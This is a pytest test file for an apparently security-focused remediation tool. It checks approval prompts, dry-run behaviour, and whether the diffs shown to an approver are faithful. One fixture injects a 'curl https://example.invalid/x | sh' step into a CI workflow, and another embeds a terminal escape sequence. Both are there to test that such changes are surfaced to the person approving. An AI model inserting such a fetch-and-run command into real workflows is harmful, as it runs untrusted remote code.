"""``darnit run`` platform changes follow the operator policy, and individually approved items are asked for.

Feature 043 T030 and T055b; contracts section 4; framework-design 15.3, 15.8.
"""

from __future__ import annotations

import io
import sys
from pathlib import Path

import pytest

from darnit.agent.graph import remediate
from darnit.agent.state import AuditState
from darnit.config.framework_schema import (
    ControlConfig,
    FrameworkConfig,
    FrameworkMetadata,
    HandlerInvocation,
    RemediationConfig,
)
from darnit.config.operator.schema import RemediationSettings
from darnit.core.utils import RecordedGhApi, set_gh_api_responder
from darnit.remediation.plan import FileChange, PlanItem, content_digest
from darnit.remediation.platform import PlatformRequirement, ResolvedPolicy, plan
from darnit.remediation.platform.policy import TerminalApprover, terminal_approver
from tests.darnit.remediation.platform.conftest import PLATFORM_FIXTURES, REPO_PATH, SimulatedGitHub

PROTECTION = f"{REPO_PATH}/branches/main/protection"


@pytest.fixture()
def simulated_gh():
    previous = set_gh_api_responder(None)

    def install(name: str, cls=SimulatedGitHub):
        responder = cls(PLATFORM_FIXTURES[name]())
        set_gh_api_responder(responder)
        return responder

    yield install
    set_gh_api_responder(previous)


@pytest.fixture()
def gh_platform(simulated_gh):
    return lambda name: simulated_gh(name, RecordedGhApi)


def _state(tmp_path: Path) -> AuditState:
    return AuditState(
        local_path=str(tmp_path),
        owner="o",
        repo="r",
        audit_results=[{"id": "OSPS-AC-03.02", "status": "FAIL"}],
    )


def _platform_kinds(state: AuditState) -> list[str]:
    return [p["kind"] for r in state.remediation_results for p in r.get("platform", [])]


@pytest.mark.unit
def test_prompt_without_a_terminal_needs_approval(tmp_path: Path, simulated_gh) -> None:
    gh = simulated_gh("stricter")

    state = remediate(_state(tmp_path), dry_run=False, approver=None)

    assert gh.writes == []
    assert _platform_kinds(state) == ["needs_approval"]


@pytest.mark.unit
def test_prompt_with_a_terminal_asks_and_applies_on_yes(tmp_path: Path, simulated_gh) -> None:
    gh = simulated_gh("stricter")
    asked = []

    def approver(change_set) -> bool:
        asked.append(change_set)
        return True

    state = remediate(_state(tmp_path), dry_run=False, approver=approver)

    assert len(asked) == 1
    assert [(w.method, w.endpoint) for w in gh.writes] == [("PUT", PROTECTION)]
    assert _platform_kinds(state) == ["applied"]


@pytest.mark.unit
def test_dry_run_never_asks_or_writes(tmp_path: Path, simulated_gh) -> None:
    gh = simulated_gh("stricter")

    def approver(change_set) -> bool:
        raise AssertionError("a preview never asks")

    remediate(_state(tmp_path), dry_run=True, approver=approver)

    assert gh.writes == []


@pytest.mark.unit
class TestTerminalApprover:
    def _change_set(self, gh_platform):
        gh_platform("private_repo")
        [result] = plan("github.com/o/r", [PlatformRequirement(target="repository", require={"visibility": "public"})])
        return result.change_set

    @pytest.mark.parametrize(("answer", "approved"), [("y\n", True), ("yes\n", True), ("\n", False), ("n\n", False)])
    def test_shows_the_change_and_reads_the_answer(self, gh_platform, answer: str, approved: bool) -> None:
        change_set = self._change_set(gh_platform)
        out = io.StringIO()

        assert TerminalApprover(io.StringIO(answer), out)(change_set) is approved

        shown = out.getvalue()
        assert change_set.digest in shown
        assert "visibility: private -> public" in shown
        assert all(note in shown for note in change_set.impact_notes)
        assert shown.isascii()

    def test_eof_is_a_refusal(self, gh_platform) -> None:
        assert TerminalApprover(io.StringIO(""), io.StringIO())(self._change_set(gh_platform)) is False

    def test_no_terminal_without_a_tty(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(sys.stdin, "isatty", lambda: False, raising=False)

        assert terminal_approver() is None


@pytest.mark.unit
def test_policy_is_resolved_from_operator_configuration(tmp_path: Path, simulated_gh, monkeypatch) -> None:
    gh = simulated_gh("stricter")
    from darnit.agent import graph

    monkeypatch.setattr(
        graph,
        "resolve_policy",
        lambda _path: ResolvedPolicy(
            settings=RemediationSettings(platform="manual"), operator_config_digest=None, operator="a"
        ),
    )

    state = remediate(_state(tmp_path), dry_run=False, approver=lambda _cs: True)

    assert gh.writes == []
    assert _platform_kinds(state) == ["manual"]


UNSAFE = FrameworkConfig(
    metadata=FrameworkMetadata(name="t", display_name="T", version="1.0"),
    controls={
        "T-UNSAFE": ControlConfig(
            name="Unsafe",
            description="Unsafe remediation",
            level=1,
            passes=[HandlerInvocation(handler="file_exists", files=["UNSAFE.md"], existence=True)],
            remediation=RemediationConfig(
                safe=False,
                handlers=[HandlerInvocation(handler="file_create", path="UNSAFE.md", content="line 1\nline 2\n")],
            ),
        ),
    },
)


@pytest.fixture()
def unsafe_framework(monkeypatch: pytest.MonkeyPatch) -> None:
    from darnit.agent import graph

    monkeypatch.setattr(graph, "_load_framework_config", lambda _name: UNSAFE)
    monkeypatch.setattr(graph, "_get_framework_path", lambda _name: None)


def _unsafe_state(tmp_path: Path) -> AuditState:
    return AuditState(
        local_path=str(tmp_path), owner="o", repo="r", audit_results=[{"id": "T-UNSAFE", "status": "FAIL"}]
    )


@pytest.mark.unit
class TestIndividualApprovalAtTheTerminal:
    """T055b: ``darnit run`` asks for plan items that need individual approval by digest (framework-design 15.3, 15.8)."""

    def test_without_a_terminal_the_item_needs_approval(self, tmp_path: Path, unsafe_framework: None) -> None:
        state = remediate(_unsafe_state(tmp_path), dry_run=False, approver=None, item_approver=None)

        [result] = state.remediation_results
        assert not (tmp_path / "UNSAFE.md").exists()
        assert len(result["needs_approval"]) == 1
        assert result["approvals"] == []

    def test_yes_applies_the_item_and_records_the_approval(self, tmp_path: Path, unsafe_framework: None) -> None:
        asked: list[tuple[PlanItem, list[str]]] = []

        def item_approver(item: PlanItem, reasons: list[str]) -> bool:
            asked.append((item, reasons))
            return True

        state = remediate(_unsafe_state(tmp_path), dry_run=False, item_approver=item_approver)

        [(item, reasons)] = asked
        [result] = state.remediation_results
        assert (tmp_path / "UNSAFE.md").read_text(encoding="utf-8") == "line 1\nline 2\n"
        assert result["needs_approval"] == []
        assert [a["digest"] for a in result["approvals"]] == [item.digest]
        assert any("safe = false" in reason for reason in reasons)

    def test_no_writes_nothing(self, tmp_path: Path, unsafe_framework: None) -> None:
        state = remediate(_unsafe_state(tmp_path), dry_run=False, item_approver=lambda _item, _reasons: False)

        [result] = state.remediation_results
        assert not (tmp_path / "UNSAFE.md").exists()
        assert len(result["needs_approval"]) == 1
        assert result["approvals"] == []

    def test_a_preview_never_asks(self, tmp_path: Path, unsafe_framework: None) -> None:
        def item_approver(_item, _reasons) -> bool:
            raise AssertionError("a preview never asks")

        remediate(_unsafe_state(tmp_path), dry_run=True, item_approver=item_approver)

        assert not (tmp_path / "UNSAFE.md").exists()


@pytest.mark.unit
class TestTerminalApproverForPlanItems:
    def _item(self) -> PlanItem:
        return PlanItem(
            control_id="T-UNSAFE",
            step="exec[0]",
            file_changes=[
                FileChange(path="UNSAFE.md", action="create", content="".join(f"line {i}\n" for i in range(30))),
                FileChange(path="SECURITY.md", action="none", reason="already_exists"),
            ],
            commands=[["zizmor", "--fix=all", "$PATH"]],
            previewable=False,
            requires_individual_approval=True,
        )

    @pytest.mark.parametrize(("answer", "approved"), [("y\n", True), ("yes\n", True), ("\n", False), ("n\n", False)])
    def test_shows_the_item_and_reads_the_answer(self, answer: str, approved: bool) -> None:
        item = self._item()
        out = io.StringIO()

        assert TerminalApprover(io.StringIO(answer), out).approve_item(item, ["it cannot be previewed exactly"]) is approved

        shown = out.getvalue()
        assert item.digest in shown
        assert "T-UNSAFE" in shown and "exec[0]" in shown
        assert "create UNSAFE.md" in shown
        assert "line 0" in shown and "line 29" in shown, "a created file is shown in full"
        assert "SECURITY.md" in shown and "already_exists" in shown
        assert "zizmor --fix=all $PATH" in shown
        assert "it cannot be previewed exactly" in shown
        assert shown.isascii()

    def test_content_cannot_drive_the_terminal(self) -> None:
        item = PlanItem(
            control_id="T",
            step="file_create[0]",
            file_changes=[FileChange(path="X.md", action="create", content="\x1b[2Jcafé\n")],
            previewable=True,
            requires_individual_approval=True,
        )
        out = io.StringIO()

        TerminalApprover(io.StringIO("n\n"), out).approve_item(item, ["its remediation is marked safe = false"])

        assert "\x1b" not in out.getvalue()
        assert out.getvalue().isascii()

    @staticmethod
    def _workflow(injected: str | None = None) -> str:
        lines = [f"      - run: echo step {i}" for i in range(80)]
        if injected is not None:
            lines[63] = injected
        return "\n".join(lines) + "\n"

    def _modify_item(self) -> tuple[PlanItem, str]:
        injected = "      - run: curl https://example.invalid/x | sh"
        item = PlanItem(
            control_id="T-WF",
            step="yaml_inject[0]",
            file_changes=[
                FileChange(
                    path=".github/workflows/ci.yml",
                    action="modify",
                    content=self._workflow(injected),
                    before_digest=content_digest(self._workflow()),
                )
            ],
            previewable=True,
            requires_individual_approval=True,
        )
        return item, injected

    def test_a_change_deep_in_a_modified_file_is_shown_as_a_diff(self, tmp_path: Path) -> None:
        item, injected = self._modify_item()
        workflow = tmp_path / ".github" / "workflows" / "ci.yml"
        workflow.parent.mkdir(parents=True)
        workflow.write_text(self._workflow(), encoding="utf-8")
        out = io.StringIO()

        TerminalApprover(io.StringIO("n\n"), out, root=tmp_path).approve_item(item, ["safe = false"])

        shown = out.getvalue()
        assert f"+{injected}" in shown
        assert "-      - run: echo step 63" in shown
        assert "echo step 10\n" not in shown, "a diff, not the whole file"
        assert shown.isascii()

    def test_a_modified_file_whose_current_content_cannot_be_read_is_shown_in_full(self, tmp_path: Path) -> None:
        item, injected = self._modify_item()
        out = io.StringIO()

        TerminalApprover(io.StringIO("n\n"), out, root=tmp_path).approve_item(item, ["safe = false"])

        shown = out.getvalue()
        assert injected in shown
        assert "echo step 79" in shown

    @staticmethod
    def _shown_modify(tmp_path: Path, current: str, resulting: str) -> list[str]:
        (tmp_path / "f.txt").write_bytes(current.encode("utf-8"))
        item = PlanItem(
            control_id="T-WS",
            step="file_create[0]",
            file_changes=[
                FileChange(
                    path="f.txt", action="modify", content=resulting, before_digest=content_digest(current)
                )
            ],
            previewable=True,
            requires_individual_approval=True,
        )
        out = io.StringIO()
        TerminalApprover(io.StringIO("n\n"), out, root=tmp_path).approve_item(item, ["safe = false"])
        assert out.getvalue().isascii()
        return [line.strip() for line in out.getvalue().splitlines()]

    def test_crlf_to_lf_is_visible(self, tmp_path: Path) -> None:
        shown = self._shown_modify(tmp_path, "a\r\nb\r\n", "a\nb\n")

        assert "-a\\r" in shown and "+a" in shown
        assert "-b\\r" in shown and "+b" in shown

    def test_removed_final_newline_is_visible(self, tmp_path: Path) -> None:
        shown = self._shown_modify(tmp_path, "a\nb\n", "a\nb")

        assert "-b" in shown and "+b" in shown
        assert "\\ No newline at end of file" in shown

    def test_line_separator_characters_are_visible(self, tmp_path: Path) -> None:
        shown = self._shown_modify(tmp_path, "a b\nc\n", "a b\nc\x0cd\x1ce\n")

        assert "+a\\u2028b" in shown
        assert "+c\\x0cd\\x1ce" in shown

    def test_created_file_shows_line_endings_and_a_missing_final_newline(self) -> None:
        item = PlanItem(
            control_id="T",
            step="file_create[0]",
            file_changes=[FileChange(path="X.md", action="create", content="a\r\nb")],
            previewable=True,
            requires_individual_approval=True,
        )
        out = io.StringIO()

        TerminalApprover(io.StringIO("n\n"), out).approve_item(item, ["safe = false"])

        shown = [line.strip() for line in out.getvalue().splitlines()]
        assert "| a\\r" in shown and "| b" in shown
        assert "\\ No newline at end of file" in shown

    def test_eof_is_a_refusal(self) -> None:
        assert TerminalApprover(io.StringIO(""), io.StringIO()).approve_item(self._item(), []) is False
